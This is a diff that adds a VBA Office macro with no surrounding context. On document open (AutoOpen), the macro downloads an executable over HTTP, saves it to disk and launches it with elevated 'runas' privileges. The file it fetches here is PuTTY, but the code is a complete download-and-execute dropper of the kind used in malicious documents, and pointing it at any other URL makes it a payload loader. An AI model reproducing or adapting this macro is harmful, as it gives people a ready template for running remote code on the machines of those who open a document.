@@ -1,0 +1,20 @@
+Sub AutoOpen()
+
+
+Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
+Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
+xHttp.Open "GET", "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe", False
+xHttp.Send
+
+  With bStrm
+        .Type = 1 '//binary
+        .Open
+        .Write xHttp.responseBody
+        .SaveTofile "putty.exe", 2  '//overwrite
+    End With
+
+Set objShell = CreateObject("Shell.Application")
+objShell.ShellExecute "putty.exe", "", "", "runas", 1
+    
+
+End Sub
